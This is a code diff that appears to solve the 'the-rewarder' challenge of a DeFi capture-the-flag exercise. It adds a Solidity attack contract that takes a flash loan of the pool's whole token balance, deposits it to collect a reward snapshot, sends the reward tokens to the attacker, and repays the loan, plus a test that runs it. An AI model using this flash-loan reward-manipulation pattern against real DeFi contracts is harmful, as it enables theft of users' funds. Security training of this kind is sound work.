@@ -10,6 +10,43 @@ import {RewardToken} from "../../../src/Contracts/the-rewarder/RewardToken.sol";
 import {AccountingToken} from "../../../src/Contracts/the-rewarder/AccountingToken.sol";
 import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";
 
+contract AttackContract {
+    FlashLoanerPool public flashLoanPool;
+    TheRewarderPool public rewarderPool;
+    RewardToken public rewardToken;
+    DamnValuableToken public dvt;
+    address public owner;
+
+    constructor(
+        address _flashLoanPool,
+        address _rewarderPool,
+        address _dvt
+    ) {
+        flashLoanPool = FlashLoanerPool(_flashLoanPool);
+        rewarderPool = TheRewarderPool(_rewarderPool);
+        rewardToken = rewarderPool.rewardToken();
+        dvt = DamnValuableToken(_dvt);
+        owner = msg.sender;
+    }
+
+    function attack() public {
+        console.log("Attack!");
+        uint256 loanBalance = dvt.balanceOf(address(flashLoanPool));
+        flashLoanPool.flashLoan(loanBalance);
+    }
+
+    function receiveFlashLoan(uint256 amount) public payable {
+        // we got some free money, let's claim all the rewards we can!
+        dvt.approve(address(rewarderPool), amount);
+        rewarderPool.deposit(amount);
+        uint256 ourIllGottenGains = rewardToken.balanceOf(address(this));
+        rewardToken.transfer(owner, ourIllGottenGains);
+        // now we repay our free money
+        rewarderPool.withdraw(amount);
+        dvt.transfer(address(flashLoanPool), amount);
+    }
+}
+
 contract TheRewarder is Test {
     uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
     uint256 internal constant USER_DEPOSIT = 100e18;
@@ -89,7 +126,15 @@ contract TheRewarder is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
-
+        vm.warp(block.timestamp + 5 days);
+        vm.startPrank(attacker);
+        AttackContract attackContract = new AttackContract(
+            address(flashLoanerPool),
+            address(theRewarderPool),
+            address(dvt)
+        );
+        attackContract.attack();
+        vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
